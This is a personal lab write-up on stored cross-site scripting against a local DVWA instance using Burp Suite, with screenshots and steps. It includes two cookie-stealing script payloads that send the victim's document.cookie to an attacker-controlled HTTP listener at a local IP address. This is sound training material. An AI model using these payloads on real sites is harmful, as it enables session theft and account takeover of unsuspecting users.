# Stored XSS


## Scope
- **Victim**: DVWA 



---


# Stored XSS - Intuition

## What is Stroed XSS - Intution?
**Stored XSS - Intuition** or ** Stored (persistent) XSS**: is like planting a hidden script in a place on a website that everyone visits - a comment, profile, forum post, product description, etc. The attacker saves (stores) malicious JavaScript on the server; later, when other users load that page, their browsers receive and execute the attacker’s script as if it were normal page content.

## Why it’s scary (intuitively)
  - One injection → many victims. A single stored payload can run for every visitor.
  - Invisible trap: victims don’t need to click a special link — just viewing the page triggers it.
  - Full browser privileges: the script runs with the same permissions as the user on that site (read DOM, send requests, steal cookies or tokens, perform actions).
  - Long-lived: payload persists until removed, giving attackers time to exploit it.

## Simple flow
1. Attacker submits malicious input into a persistent field (e.g., a comment box).
2. Server saves that input in the database without proper escaping.
3. Another user opens the page; the server delivers the stored content.
4. The user’s browser renders the page and executes the stored script.
5. Attacker achieves their objective (session theft, CSRF-like actions, phishing UI, data exfiltration).


# Stored XSS - Intuition Methodology
## In this i used it with my DVWA 
- In this i use `DVWA` in my local machine: 



- So first login to our target: 
- So first i want to set it to `LOW SECURITY LEVEL`:

## Using with Burp Suite 
- First i open my `Burp Suite` -> go to `Interecpt` and do `Intecept on` -> and in browser click `Sign Guestbook`:
<img width="1700" height="878" alt="image" src="https://github.com/user-attachments/assets/228034f6-8671-4e2d-bd74-f5ef7bd66f72" />

- And after we will see this:
<img width="1583" height="576" alt="image" src="https://github.com/user-attachments/assets/207da268-eae9-4943-806f-13cc8344180c" />

<img width="1577" height="863" alt="image" src="https://github.com/user-attachments/assets/0348229c-96ba-4701-a310-d60ceeccfe37" />

- After click on `Forward`
<img width="1197" height="591" alt="image" src="https://github.com/user-attachments/assets/700ebbaf-7455-4fec-8cfa-45ee999173e4" />

- After we will see this:
<img width="1577" height="806" alt="image" src="https://github.com/user-attachments/assets/945f0bb8-05b8-4f70-8c61-1ef5d2814a7e" />

<img width="1582" height="810" alt="image" src="https://github.com/user-attachments/assets/21e859f0-971f-46d3-abfe-2f3116d4d0e2" />

- And after we click on `Forward` again:
<img width="1575" height="805" alt="image" src="https://github.com/user-attachments/assets/47f25231-39c4-4688-9af2-778419393864" />

- And in browser we see this:
<img width="901" height="711" alt="image" src="https://github.com/user-attachments/assets/40831623-3c3d-4ae3-accc-6a029d43f9f3" />

---


## BASIC STORED XSS TESTING

### Test Basic Script Alter
````
<script>alert(1)</script>
````

- First in `Burp Suite` we need to open `Ìntercept on`:
<img width="1445" height="795" alt="image" src="https://github.com/user-attachments/assets/1f7d725d-6f81-44d7-a1e2-a037160d109c" />

- We will see `new payload` in our `Burp Suite` :
<img width="1142" height="482" alt="image" src="https://github.com/user-attachments/assets/7a1383f6-e435-4853-b93d-32c9dd9c3200" />


- And after click `Do Intecept` -> `Response to this request`: 
<img width="1065" height="863" alt="image" src="https://github.com/user-attachments/assets/6acdfffc-28b4-43d0-a37c-d7cb7185c176" />

- And after click on `Forward`:
<img width="1146" height="522" alt="image" src="https://github.com/user-attachments/assets/3771b2bb-31ec-4c1d-9054-bd11b4eabf9b" />

- We will see this:
<img width="1572" height="811" alt="image" src="https://github.com/user-attachments/assets/9f29c947-ce09-478a-b6f9-3ca53966dc9a" />

- And after click on `Forward` again, it will show this in `browser`:
<img width="923" height="626" alt="image" src="https://github.com/user-attachments/assets/4f7bf5c3-bb7c-4232-a135-04b9f867474f" />

- And we go to others fields and continue to click on it until `XSS (Stored)`:
<img width="896" height="628" alt="image" src="https://github.com/user-attachments/assets/d294ea1d-f694-4a61-bbec-96e3d4aae385" />

- We will see this:
<img width="916" height="484" alt="image" src="https://github.com/user-attachments/assets/be51ba0d-3319-4a09-9a19-b58bf02bd174" />

---


## ADVANCED PAYLOAD TESTING

- In this if we want to check `cookie` in `console`:
<img width="1916" height="311" alt="image" src="https://github.com/user-attachments/assets/33691f9b-55d9-46d6-abc7-e97b765a66e9" />

### Cookie Stealer Payload
- In our kali terminal type this command:
````
python3 -m http.server 8080
````
<img width="522" height="120" alt="image" src="https://github.com/user-attachments/assets/280035da-df22-4267-98f8-0dd49e989e1c" />

- And it will show this in `Burp Suite`:
<img width="1476" height="884" alt="image" src="https://github.com/user-attachments/assets/6c5a2761-1f3d-45aa-860e-edf2f8e2b330" />

- And after type this `payload` in `Burp Suite`:
````
<script>
var cookies = document.cookie;
alert('52f23l16nl2mk6ejrbvb6b1vg7' + cookies);
(new Image()).src = 'http://192.168.100.97:8080/log?c=' + encodeURIComponent(cookies);
</script>
````
<img width="1880" height="830" alt="image" src="https://github.com/user-attachments/assets/2799b5a4-8119-42c3-9598-ccea23a41c1e" />

- In this we encode it `Ctrl + U` to encode it and after click on `Forward` -> and after we click on `Forward` we will see this.
<img width="911" height="626" alt="image" src="https://github.com/user-attachments/assets/3878c7cd-0467-4d2e-9d9f-7352bd010143" />

---




## Cookie Stealing attack

- In this i use with my `burp suite` -> and open `Intercept on`:
<img width="1914" height="780" alt="image" src="https://github.com/user-attachments/assets/6d506d6a-f53f-40fe-9561-6abeacb013bc" />

- Auto-Steal Cookies
````
<script>
var cookies = document.cookie;
var img = new Image();
img.src = 'http://192.168.100.97:8080/vulnerabilities/xss_s/?stolen_cookies=' + cookies;
alert('Cookies sent: ' + cookies);
</script>
````
- After we open our `Burp Suite` and click on `Ctrl + U`.

- After click on `Forward`
<img width="1912" height="587" alt="image" src="https://github.com/user-attachments/assets/c7cd475e-4600-4366-bedc-619bd719d588" />

- And go back to `Browser` we will see this:
<img width="923" height="654" alt="image" src="https://github.com/user-attachments/assets/238dfd17-a19a-455b-bf37-6f88276a052d" />


- And check `URL`: we will see this:
<img width="910" height="457" alt="image" src="https://github.com/user-attachments/assets/83ecf255-0853-4d30-8105-f7c41ca4f0c1" />


-----



## Finished Of Stored XSS


---
## Practice By: Nin Kanong (k4n0ng)

### Date: 26/10/2025
---
